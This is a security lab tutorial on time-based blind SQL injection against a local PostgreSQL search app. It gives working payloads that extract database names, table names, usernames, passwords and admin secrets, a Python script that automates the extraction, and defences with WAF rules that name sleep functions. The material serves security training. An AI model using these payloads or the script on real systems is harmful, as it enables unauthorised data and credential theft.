# Blind SQL Injection with Time Delays and Information Retrieval

## **What is SQL?**

SQL, or Structured Query Language, is a programming language used to manage and interact with relational databases, enabling users to perform tasks like retrieving, inserting, updating, or deleting data.

![SQL Diagram](https://raw.githubusercontent.com/poridhiEng/lab-asset/384d7187ced110f790597c29edb3f78690286cd2/Security%20Lab%20Assets/Web%20Security%20Labs/SQLi/Lab%2006/images/SQL.drawio.svg)

SQL is used in various operations such as searching for products in an e-commerce application. The server constructs an SQL query using user input (like a search term) and sends it to the database to retrieve matching records. The results are then presented to the user based on the query's output.

## What is Blind SQL Injection with Time Delays?

Blind SQL injection occurs when an application is vulnerable to SQL injection, but the HTTP responses do not contain the results of the relevant SQL query or any database errors. **Time-based blind SQL injection** is a technique where attackers use database functions that cause deliberate delays to infer information from the database based on response times.

### The Challenge for Attackers

In blind SQL injection scenarios, attackers face several limitations:
```sql
-- Original query returns normal results
SELECT id, name FROM products WHERE name ILIKE '%search%'

-- Problem: No error messages shown, no data leakage visible
-- Solution: Use time delays to extract information bit by bit

-- If condition is TRUE: Response takes 5+ seconds
laptop' AND (SELECT pg_sleep(5)) IS NULL--

-- If condition is FALSE: Response takes normal time (~100ms)
laptop' AND 1=2 AND (SELECT pg_sleep(5)) IS NULL--
```

### How Time-Based Extraction Works

**Normal Response Time:** ~50-200 milliseconds  
**Delayed Response Time:** ~5000+ milliseconds (when pg_sleep(5) executes)

By measuring response times, attackers can determine if specific conditions are TRUE or FALSE:

```sql
-- Check if database name length is 8 characters
laptop' AND (SELECT CASE WHEN length(current_database())=8 THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--

-- If response is delayed (5+ seconds): Database name is 8 characters
-- If response is quick (~100ms): Database name is NOT 8 characters
```

## Key Requirements for Time-Based Blind Injection

For successful time-based blind SQL injection, three critical techniques must be mastered:

### 1. Time Delay Functions
Different databases use different time delay functions:

**PostgreSQL (this lab):**
```sql
SELECT pg_sleep(5)  -- Delay for 5 seconds
```

**MySQL:**
```sql
SELECT SLEEP(5)  -- Delay for 5 seconds
```

**Microsoft SQL Server:**
```sql
WAITFOR DELAY '00:00:05'  -- Delay for 5 seconds
```

### 2. Conditional Logic
Use conditional statements to trigger delays based on data:

**PostgreSQL:**
```sql
SELECT CASE 
  WHEN condition_is_true THEN pg_sleep(5)
  ELSE 0 
END
```

### 3. Information Extraction Strategy
Extract data systematically using binary search or character-by-character extraction:

**Character-by-character extraction:**
```sql
-- Extract first character of username
CASE WHEN substring(username,1,1)='a' THEN pg_sleep(5) ELSE 0 END
CASE WHEN substring(username,1,1)='b' THEN pg_sleep(5) ELSE 0 END
-- Continue until delay occurs...
```

**Binary search approach:**
```sql
-- Check if ASCII value > 100 (faster than testing each character)
CASE WHEN ascii(substring(username,1,1))>100 THEN pg_sleep(5) ELSE 0 END
```

## Objective

Learn how to exploit blind SQL injection vulnerabilities using time delays by:
1. **Detecting the vulnerability** using basic time delay payloads
2. **Confirming database type** and gathering system information
3. **Extracting database structure** (tables, columns)
4. **Retrieving sensitive data** character by character
5. **Automating the extraction process** for efficiency

## Setup Instructions

### Option 1: Using Docker Compose (Recommended)

1. **Download the Lab Files**

   ```bash
   git clone https://github.com/your-repo/blind-sqli-lab.git
   cd blind-sqli-lab
   ```

2. **Start the Application**

   ```bash
   docker-compose up -d
   ```

3. **Verify Services are Running**

   ```bash
   docker-compose ps
   ```

   You should see:
   - `blind-sqli-backend` running on port 5000
   - `blind-sqli-frontend` running on port 5173
   - `blind-sqli-db` (PostgreSQL) running on port 5432

4. **Access the Web Application**

   Open your browser and navigate to: `http://localhost:5173`



### Project Structure

```
├── backend/
│   ├── .env.example
│   ├── package.json
│   └── server.js
├── frontend/
│   ├── src/
│   │   ├── App.jsx
│   │   ├── Home.jsx
│   │   ├── ProductDetail.jsx
│   │   ├── SearchFilter.jsx
│   │   ├── App.css
│   │   └── main.jsx
│   ├── package.json
│   └── vite.config.js
├── db/
│   └── init.sql
├── docker-compose.yml
└── README.md
```

## Understanding the Target Application

### Normal Application Behavior
1. **Homepage**: Displays a product search interface
2. **Search Function**: Users can search for products by name
3. **URL Structure**: `http://localhost:3000/?search=laptop` searches for products
4. **Backend Query**: `SELECT id, name FROM products WHERE name ILIKE '%laptop%'`
5. **Response Behavior**: Returns matching products in JSON format

### Identifying the Vulnerability
The search parameter is directly concatenated into the SQL query without proper sanitization, making it vulnerable to SQL injection.

## Lab Instructions

### Phase 1: Vulnerability Detection and Basic Time Delays

#### Step 1: Understand Normal Application Behavior
1. **Browse the application**
   - Visit http://localhost:5173
   - Use the search box to search for "laptop", "smartphone", etc.
   - Observe normal response times (~100-500ms)
   - Notice the URL structure: `?search=laptop`

#### Step 2: Test for Basic SQL Injection
Try breaking the SQL syntax to confirm injection possibility:

```
URL: ?search=laptop'
```

**Expected Result**: Application should handle the error gracefully (no visible error message in blind injection).

#### Step 3: Confirm Time-Based Injection
Test basic time delay to confirm the vulnerability:

```
?search=laptop' AND (SELECT pg_sleep(5)) IS NULL--
```

**Expected Result**: 
- **Normal search**: Response in ~100-500ms
- **Time injection**: Response in ~5000ms+ (5+ seconds delay)

**What happens**: The `pg_sleep(5)` function executes, causing a 5-second delay before the response.

#### Step 4: Alternative Time Delay Syntax
Test different working syntaxes:

```
?search=laptop' OR (SELECT pg_sleep(5)) IS NULL--
```

**Expected Result**: Should also cause a 5-second delay, confirming the injection works with different logical operators.

### Phase 2: Database Information Gathering

#### Step 5: Confirm Database Type
Verify you're working with PostgreSQL:

```
?search=laptop' AND (SELECT CASE WHEN version() LIKE '%PostgreSQL%' THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--
```

**Result**: If delayed, confirms PostgreSQL database.

#### Step 6: Extract Database Name Length
Determine the length of the current database name:

```
?search=laptop' AND (SELECT CASE WHEN length(current_database())=8 THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--
```

Try different numbers until you get a delay.

#### Step 7: Extract Database Name Character by Character
Once you know the length, extract each character:

```
?search=laptop' AND (SELECT CASE WHEN substring(current_database(),1,1)='b' THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--
```

Continue with position 2, 3, etc., and test different characters (a-z, 0-9, _).

### Phase 3: Database Structure Enumeration

#### Step 8: Check for Target Tables
Test for existence of common tables:

```
?search=laptop' AND EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name='users') AND (SELECT pg_sleep(5)) IS NULL--
```

**Working Tables to Test:**
- `users`
- `admin_users` 
- `products`
- `customers`

#### Step 9: Count Tables in Database
Determine how many tables exist:

```
?search=laptop' AND (SELECT CASE WHEN (SELECT count(*) FROM information_schema.tables WHERE table_schema='public')>3 THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--
```

#### Step 10: Extract Table Names
Once you know tables exist, extract their names:

```
?search=laptop' AND (SELECT CASE WHEN substring((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1),1,1)='p' THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--
```

### Phase 4: Data Extraction

#### Step 11: Count Records in Target Tables
Determine how many users exist:

```
?search=laptop' AND (SELECT CASE WHEN (SELECT count(*) FROM users)>5 THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--
```

#### Step 12: Extract Column Information
Find column names in the users table:

```
?search=laptop' AND EXISTS(SELECT 1 FROM information_schema.columns WHERE table_name='users' AND column_name='password') AND (SELECT pg_sleep(5)) IS NULL--
```

**Common columns to test:**
- `username`
- `password`
- `email`
- `id`

#### Step 13: Extract User Data
Extract usernames character by character:

```
?search=laptop' AND (SELECT CASE WHEN substring((SELECT username FROM users LIMIT 1),1,1)='j' THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--
```

#### Step 14: Extract Password Data
Once you have usernames, extract passwords:

```
?search=laptop' AND (SELECT CASE WHEN substring((SELECT password FROM users WHERE username='john_doe'),1,1)='m' THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--
```

#### Step 15: Extract Admin Data
Target high-value admin information:

```
?search=laptop' AND (SELECT CASE WHEN substring((SELECT admin_password FROM admin_users LIMIT 1),1,1)='a' THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--
```

## Database Schema

Understanding the target database structure:

### products table
```sql
CREATE TABLE products (
    id SERIAL PRIMARY KEY,
    name VARCHAR(255) NOT NULL
);
```

### users table (target for extraction)
```sql
CREATE TABLE users (
    id SERIAL PRIMARY KEY,
    username VARCHAR(255) UNIQUE NOT NULL,
    email VARCHAR(255) UNIQUE NOT NULL,
    password VARCHAR(255) NOT NULL,
    full_name VARCHAR(255),
    phone VARCHAR(20)
);
```

### admin_users table (high-value target)
```sql
CREATE TABLE admin_users (
    id SERIAL PRIMARY KEY,
    admin_username VARCHAR(255) UNIQUE NOT NULL,
    admin_password VARCHAR(255) NOT NULL,
    role VARCHAR(50) DEFAULT 'admin',
    access_level INTEGER DEFAULT 1,
    secret_key VARCHAR(255)
);
```

## Working Payload Examples

### Basic Time Delay Testing
```
laptop' AND (SELECT pg_sleep(5)) IS NULL--
laptop' OR (SELECT pg_sleep(5)) IS NULL--
```

### Boolean Information Extraction
```
laptop' AND (SELECT CASE WHEN length(current_database())=8 THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--
laptop' AND (SELECT CASE WHEN substring(current_database(),1,1)='b' THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--
```

### Table and Data Existence
```
laptop' AND EXISTS(SELECT 1 FROM information_schema.tables WHERE table_name='admin_users') AND (SELECT pg_sleep(5)) IS NULL--
```

### Character-by-Character Data Extraction
```
laptop' AND (SELECT CASE WHEN substring((SELECT username FROM users LIMIT 1),1,1)='j' THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--
```

## Attack Automation

For efficient data extraction, consider automating the process:

### Python Script Example
```python
import requests
import time
import string

def test_condition(payload):
    url = f"http://localhost:3000/?search={payload}"
    start_time = time.time()
    response = requests.get(url)
    end_time = time.time()
    
    return (end_time - start_time) > 4  # True if delay > 4 seconds

def extract_data(query_template, max_length=50):
    result = ""
    for position in range(1, max_length + 1):
        found = False
        for char in string.ascii_letters + string.digits + '_@.-':
            payload = f"laptop' AND (SELECT CASE WHEN substring({query_template},{position},1)='{char}' THEN pg_sleep(5) ELSE 0 END) IS NOT NULL--"
            if test_condition(payload):
                result += char
                found = True
                break
        if not found:
            break
    return result

# Extract database name
db_name = extract_data("current_database()")
print(f"Database name: {db_name}")

# Extract first username
username = extract_data("(SELECT username FROM users LIMIT 1)")
print(f"First username: {username}")
```

## Prevention and Mitigation

### Primary Defense: Parameterized Queries

**Vulnerable Code:**
```javascript
const query = `SELECT id, name FROM products WHERE name ILIKE '%${search}%'`;
```

**Secure Code:**
```javascript
const query = 'SELECT id, name FROM products WHERE name ILIKE $1';
const result = await pool.query(query, [`%${search}%`]);
```

### Secondary Defenses

**Input Validation:**
```javascript
const search = req.query.search;
if (search && (search.includes('sleep') || search.includes('pg_sleep'))) {
    return res.status(400).json({error: 'Invalid search term'});
}
```

**Query Timeout:**
```javascript
const pool = new Pool({
    // ... other config
    statement_timeout: 1000,  // 1 second timeout
    query_timeout: 1000
});
```

**Response Time Masking:**
```javascript
const startTime = Date.now();
// Execute query
const endTime = Date.now();
const executionTime = endTime - startTime;

// Always delay to minimum time to mask timing differences
const minResponseTime = 500;
if (executionTime < minResponseTime) {
    await new Promise(resolve => setTimeout(resolve, minResponseTime - executionTime));
}
```

**Web Application Firewall (WAF) Rules:**
```
# Block time delay functions
SecRule ARGS "@rx (?i:pg_sleep|sleep|waitfor|delay)" "block,msg:'SQL Time Delay Attack'"

# Block SQL injection patterns
SecRule ARGS "@rx (?i:union|select|case\s+when)" "block,msg:'SQL Injection Attempt'"
```

### Database-Level Protection
```sql
-- Limit query execution time
ALTER DATABASE your_database SET statement_timeout = '5s';

-- Revoke access to timing functions for application user
REVOKE EXECUTE ON FUNCTION pg_sleep(double precision) FROM app_user;
```

## Performance Impact and Detection

### Response Time Analysis
- **Normal queries**: 50-200ms
- **Time-based attacks**: 5000ms+ per payload
- **Detection threshold**: Queries taking >1000ms consistently

### Logging and Monitoring
```javascript
// Log suspicious timing patterns
if (executionTime > 1000) {
    console.warn(`Suspicious slow query detected: ${query}, Time: ${executionTime}ms, IP: ${req.ip}`);
}
```

## Conclusion

This lab provides comprehensive training on blind SQL injection with time delays, teaching you to:

- Detect blind SQL injection vulnerabilities using time-based techniques
- Extract database information systematically without visible output
- Use PostgreSQL-specific functions for time-based attacks
- Understand the relationship between response times and data extraction
- Implement proper defenses against time-based blind SQL injection

Blind SQL injection with time delays is a powerful technique that allows attackers to extract sensitive information even when applications don't display error messages or query results. Understanding these techniques is crucial for both penetration testing and building secure applications.

---

**Important Note**: This lab is for educational purposes only. Never attempt these techniques on systems you don't own or don't have explicit permission to test.